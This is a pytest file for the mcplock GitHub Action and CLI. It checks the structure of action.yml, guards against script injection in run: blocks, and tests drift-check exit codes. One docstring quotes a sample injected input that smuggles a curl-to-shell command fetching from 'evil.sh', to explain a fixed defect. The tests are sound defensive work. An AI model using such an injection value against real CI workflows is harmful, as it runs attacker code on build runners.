"""Tests for GitHub Action definition and CLI CI behavior / exit code paths."""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest
from conftest import SERVER_COMMAND, run_cli


class TestActionDefinition:
    def test_action_yml_exists_and_has_required_structure(self) -> None:
        action_path = Path(__file__).parent.parent / ".github" / "actions" / "mcp-lock-action" / "action.yml"
        assert action_path.exists(), "Action definition file must exist"

        content = action_path.read_text(encoding="utf-8")
        assert "name: 'mcplock check'" in content
        assert "using: 'composite'" in content
        assert "inputs:" in content
        assert "server:" in content
        assert "fail-on:" in content
        assert "default: 'high'" in content

    def test_action_inputs_contain_all_cli_options(self) -> None:
        action_path = Path(__file__).parent.parent / ".github" / "actions" / "mcp-lock-action" / "action.yml"
        content = action_path.read_text(encoding="utf-8")

        for expected in ("server:", "transport:", "fail-on:", "json-report:", "env:", "python-version:", "mcplock-version:"):
            assert expected in content


ACTION_PATH = Path(__file__).parent.parent / ".github" / "actions" / "mcp-lock-action" / "action.yml"


def _run_blocks() -> list[tuple[int, str]]:
    """Return (line_number, text) for every ``run:`` script block in the Action."""
    lines = ACTION_PATH.read_text(encoding="utf-8").splitlines()
    blocks: list[tuple[int, str]] = []

    index = 0
    while index < len(lines):
        match = re.match(r"^(\s*)run:\s*\|", lines[index])
        if not match:
            index += 1
            continue

        indent = len(match.group(1))
        start = index + 2
        body: list[str] = []
        index += 1
        while index < len(lines):
            line = lines[index]
            if line.strip() and (len(line) - len(line.lstrip())) <= indent:
                break
            body.append(line)
            index += 1
        blocks.append((start, "\n".join(body)))

    return blocks


class TestActionScriptInjection:
    """GitHub substitutes ``${{ ... }}`` into the script *before* bash parses it.

    Any expression inside a ``run:`` block is therefore a script-injection vector
    regardless of quoting — a ``server`` input of ``foo"; curl evil.sh | sh; #``
    executes on the runner. Caller input must arrive via ``env:`` and be read as a
    shell variable. This was a live defect, not a hypothetical.
    """

    def test_run_blocks_were_found(self) -> None:
        """Guard the guard — a parser that finds nothing would pass vacuously."""
        assert len(_run_blocks()) >= 2

    def test_no_expression_interpolation_inside_run(self) -> None:
        offenders = [
            (line_no, ln.strip())
            for line_no, body in _run_blocks()
            for ln in body.splitlines()
            if "${{" in ln
        ]

        assert not offenders, (
            "GitHub expression interpolated into a run: block. Pass it via `env:` "
            "and reference it as a shell variable — substitution happens before "
            f"bash parses the script, so quoting does not help. Offenders: {offenders}"
        )

    def test_caller_inputs_are_passed_through_env(self) -> None:
        content = ACTION_PATH.read_text(encoding="utf-8")

        for name in ("MCPLOCK_SERVER", "MCPLOCK_ENV", "MCPLOCK_VERSION"):
            assert name in content, f"{name} should carry caller input into the script"

    def test_env_pairs_split_without_reevaluation(self) -> None:
        """``for pair in $VAR`` word-splits *and* globs; ``read -ra`` does neither.

        Comment lines are skipped — the Action documents the unsafe form in a
        comment explaining why it is not used.
        """
        code = [
            ln
            for ln in ACTION_PATH.read_text(encoding="utf-8").splitlines()
            if not ln.lstrip().startswith("#")
        ]

        assert any("read -ra" in ln for ln in code)
        assert not [ln for ln in code if re.search(r"for\s+\w+\s+in\s+\$\{?MCPLOCK_ENV", ln)]


@pytest.mark.e2e
class TestActionCliLogic:
    def test_check_exit_code_0_when_no_drift(self, tmp_path: Path) -> None:
        """Creating baseline and re-scanning with check returns exit 0."""
        snap = run_cli("snapshot", SERVER_COMMAND, home=tmp_path, variant="baseline")
        assert snap.returncode == 0

        check = run_cli("check", SERVER_COMMAND, home=tmp_path, variant="baseline")
        assert check.returncode == 0
        assert "No drift" in check.stdout

    def test_check_exit_code_1_when_drift_at_or_above_fail_on(self, tmp_path: Path) -> None:
        """High severity drift exits code 1 under default --fail-on high."""
        snap = run_cli("snapshot", SERVER_COMMAND, home=tmp_path, variant="baseline")
        assert snap.returncode == 0

        check = run_cli("check", SERVER_COMMAND, home=tmp_path, variant="destructive_word")
        assert check.returncode == 1
        assert "finding(s) at or above high" in check.stdout

    def test_check_exit_code_0_when_drift_below_fail_on(self, tmp_path: Path) -> None:
        """Setting --fail-on critical allows high-severity drift to pass with exit 0."""
        snap = run_cli("snapshot", SERVER_COMMAND, home=tmp_path, variant="baseline")
        assert snap.returncode == 0

        check = run_cli(
            "check",
            SERVER_COMMAND,
            "--fail-on",
            "critical",
            home=tmp_path,
            variant="destructive_word",
        )
        assert check.returncode == 0, check.stderr
        assert "Drift detected" in check.stdout

    def test_check_exit_code_2_when_baseline_missing(self, tmp_path: Path) -> None:
        """Unpinned server in check exits code 2 (not 0)."""
        check = run_cli("check", SERVER_COMMAND, home=tmp_path, variant="baseline")
        assert check.returncode == 2
        assert "No baseline for" in check.stderr

    def test_check_writes_json_report_when_requested(self, tmp_path: Path) -> None:
        """--json flag outputs valid JSON report."""
        snap = run_cli("snapshot", SERVER_COMMAND, home=tmp_path, variant="baseline")
        assert snap.returncode == 0

        json_file = tmp_path / "check_report.json"
        check = run_cli(
            "check",
            SERVER_COMMAND,
            "--json",
            str(json_file),
            home=tmp_path,
            variant="destructive_word",
        )
        assert check.returncode == 1
        assert json_file.exists()

        payload = json.loads(json_file.read_text(encoding="utf-8"))
        assert "findings" in payload
        assert len(payload["findings"]) == 1
        assert payload["findings"][0]["severity"] == "high"

    def test_ci_log_output_rendering(self, tmp_path: Path) -> None:
        """Description diff lines render cleanly with - and + for CI log viewers."""
        snap = run_cli("snapshot", SERVER_COMMAND, home=tmp_path, variant="baseline")
        assert snap.returncode == 0

        check = run_cli("check", SERVER_COMMAND, home=tmp_path, variant="destructive_word")
        assert check.returncode == 1
        assert "- " in check.stdout
        assert "+ " in check.stdout
